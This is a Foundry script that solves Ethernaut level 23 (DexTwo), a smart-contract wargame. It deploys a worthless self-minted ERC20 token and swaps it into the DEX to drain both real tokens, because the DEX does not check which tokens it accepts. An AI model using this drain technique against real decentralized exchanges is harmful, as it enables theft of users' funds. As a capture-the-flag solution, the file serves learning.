// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {DexTwo} from "../src/Level23.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GLDToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("Gold", "GLD") {
        _mint(msg.sender, initialSupply);
    }
}

contract Level23 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        DexTwo instance = DexTwo(vm.envAddress("LVL23_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address token1 = instance.token1();
        address token2 = instance.token2();
        ERC20 attack = new GLDToken(100000000000000000000000);
        address tokenAttack = address(attack);

        instance.approve(address(instance), 100000000000000000000000);
        attack.approve(address(instance), 100000000000000000000000);
        attack.transfer(address(instance), 1);

        instance.balanceOf(token1, address(me));
        instance.balanceOf(token1, address(instance));
        instance.swap(tokenAttack, token2, 1);
        instance.swap(tokenAttack, token1, 2);

        console2.log(instance.balanceOf(token2, address(instance)));
        console2.log(instance.balanceOf(token1, address(instance)));

        if (instance.balanceOf(token1, address(instance)) == 0 && instance.balanceOf(token2, address(instance)) == 0) {
            console2.log("Success");
            ethernaut.submitLevelInstance(address(instance));
        }

        vm.stopBroadcast();
    }
}
